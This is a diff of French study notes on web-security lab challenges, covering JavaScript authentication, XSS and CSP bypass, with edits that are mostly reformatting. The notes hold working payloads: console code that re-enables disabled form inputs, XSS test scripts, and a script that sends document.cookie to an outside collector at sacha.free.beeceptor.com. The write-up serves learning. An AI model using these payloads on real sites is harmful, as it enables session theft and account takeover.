@@ -4,25 +4,23 @@
 --------------------------------------------------------
 
 Console
-::
 
-   var input = document.body.getElementsByTagName("input");
-   for(i=0; i<input.length; i++)
-   {
+
+    var input = document.body.getElementsByTagName("input");
+    for(i=0; i<input.length; i++)
+    {
       if( typeof(input[i]) != 'undefined' )
           input[i].disabled = false;
-   }
+    }
 
 
 Morale : Le HTML peut être modifié et détourné
 
 2. Javascript authentification
 --------------------------
-::
 
    Chercher dans les outils de développeurs, le script de login.js
-
-Morale : Les fichiers Js peuvent être visible et leurs informations sensibles, dans F12->application->Frame->Script
+   Morale : Les fichiers Js peuvent être visible et leurs informations sensibles, dans F12->application->Frame->Script
 
 3. Javascript source ( même astuce que précédemment )
 --------------------------
@@ -65,19 +63,16 @@ Morale : Les fichiers Js peuvent être visible et leurs informations sensibles, 
 --------------------------------
 
 savoir si un formulaire permet l'éxécution de code :
-::
 
-   <script>console.warn('code executed');</script>
 
-::
-
-   <script>alert('code executed');</script>
+    <script>console.warn('code executed');</script>
+    <script>alert('code executed');</script>
 
 
 Injection de HTML ( et <script> ) dans un form non sécurisé, pour recuperer un cookie sur un hooker a cookie ( avec mdp,..)
-::
 
-   <script>window.location="https://sacha.free.beeceptor.com?cookie="+document.cookie</script>
+
+    <script>window.location="https://sacha.free.beeceptor.com?cookie="+document.cookie</script>
 
 
 9. CSP Bypass - Inline code
@@ -105,10 +100,8 @@ Injection de HTML ( et <script> ) dans un form non sécurisé, pour recuperer un
 
 essai:
 Jouer avec l'URL, et le document cookie à envoyer sur un hooker de cookie
-::
 
-
-   <img src="https://sacha.free.beeceptor.com" onload=(alert('error'); >
+    <img src="https://sacha.free.beeceptor.com" onload=(alert('error'); >
 
 16. CSP Bypass - Dangling markup 2
 ----------------------------
